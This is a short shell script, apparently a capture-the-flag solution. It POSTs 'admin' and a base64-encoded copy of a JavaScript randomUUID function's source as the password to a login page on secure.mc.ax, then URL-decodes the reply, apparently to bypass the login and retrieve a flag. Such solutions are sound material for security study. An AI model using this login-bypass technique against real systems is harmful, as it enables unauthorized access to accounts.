#!/bin/sh

function urldecode() { : "${*//+/ }"; echo -e "${_//%/\\x}"; }

urldecode $(curl -sX POST \
	-d "username=$(printf 'admin' | base64)" \
	-d "password=ZnVuY3Rpb24gcmFuZG9tVVVJRChvcHRpb25zKSB7CiAgaWYgKG9wdGlvbnMgIT09IHVuZGVmaW5lZCkKICAgIHZhbGlkYXRlT2JqZWN0KG9wdGlvbnMsICdvcHRpb25zJyk7CiAgY29uc3QgewogICAgZGlzYWJsZUVudHJvcHlDYWNoZSA9IGZhbHNlLAogIH0gPSBvcHRpb25zIHx8IHt9OwoKICB2YWxpZGF0ZUJvb2xlYW4oZGlzYWJsZUVudHJvcHlDYWNoZSwgJ29wdGlvbnMuZGlzYWJsZUVudHJvcHlDYWNoZScpOwoKICByZXR1cm4gZGlzYWJsZUVudHJvcHlDYWNoZSA/IGdldFVuYnVmZmVyZWRVVUlEKCkgOiBnZXRCdWZmZXJlZFVVSUQoKTsKfQ==" \
	https://secure.mc.ax/login)

